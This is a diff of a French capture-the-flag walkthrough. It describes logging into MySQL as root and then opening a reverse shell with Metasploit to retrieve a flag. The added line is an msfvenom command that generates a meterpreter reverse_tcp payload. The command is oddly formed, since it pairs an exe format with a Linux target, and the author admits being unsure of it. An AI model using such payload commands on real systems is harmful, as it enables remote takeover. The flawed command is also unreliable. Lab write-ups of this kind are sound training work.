@@ -83,7 +83,7 @@ mysql -h [ip.host] -u root -p[PASSWORD]
 Une fois connecté au port SQL avec les droits root, l'utilisateur sera en possibilité d'éxecuter un reverse shell sur la machine host à l'aide de la librairie metasploit.
 
 ```bash
-[command creating metasploit payload ]
+[msfvenom   linux/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=3306 -f exe -o payload.exe -a x64 --platform linux      ] (on est pas sur mais wola ça marche )
 ```
 
 Il devra ensuite naviguer dans les fichiers et récupérer le flag.
